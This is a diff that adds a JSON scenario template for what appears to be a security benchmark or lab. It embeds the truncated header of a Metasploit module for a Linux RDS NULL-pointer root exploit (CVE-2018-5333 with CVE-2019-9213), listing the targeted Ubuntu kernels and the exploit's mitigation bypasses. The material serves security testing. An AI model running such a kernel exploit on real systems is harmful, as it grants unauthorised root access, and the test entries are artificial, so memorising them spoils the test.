@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47957",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: Reliable Datagram Sockets (RDS) - rds_atomic_free_op NULL pointer dereference Privilege Escalation (Metasploit) (CVE-2019-9213;CVE-2018-5333)\n\nExploit source code (47957.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by abusing\n        a NULL pointer dereference in the `rds_atomic_free_op` function in the\n        Reliable Datagram Sockets (RDS) kernel module (rds.ko).\n\n        Successful exploitation requires the RDS kernel module to be loaded.\n        If the RDS module is not blacklisted (default); then it will be loaded\n        automatically.\n\n        This exploit supports 64-bit Ubuntu Linux systems, including distributions\n        based on Ubuntu, such as Linux Mint and Zorin OS.\n\n        Target offsets are available for:\n\n        Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and\n        Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.\n\n        This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.\n        Failed exploitation may crash the kernel.\n\n        This module has been tested successfully on various 4.4 and 4.8 kernels.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mohamed Ghannam', # Discovery of RDS rds_atomic_free_op null pointer dereference and DoS PoC (2018-5333)\n          'Jann Horn',       # Discovery of MAP_GROWSDOWN mmap_min_addr bypass technique and PoC code (CVE-2019-9213)\n          'wbowling',        # C exploit combining 2018-5333 and CVE-2019-9213 targeting Ubuntu 16.04 kernel 4.4.0-116-generic\n          'bcoles',          # Metasploit module and updated C exploit\n          'nstarke'          # Additional kernel offsets\n        ],\n      'DisclosureDate' => '2018-11-01',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2018-5333' ],\n          [ 'CVE', '2019-9213' ],\n          [ 'BID', '102510' ],\n          [ 'URL', 'https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4' ],\n          [ 'URL', 'https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c' ],\n          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2' ],\n          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-5333.html' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/l\n```",
+  "cve": "CVE-2019-9213;CVE-2018-5333",
+  "exploitdb_id": "47957",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47957",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
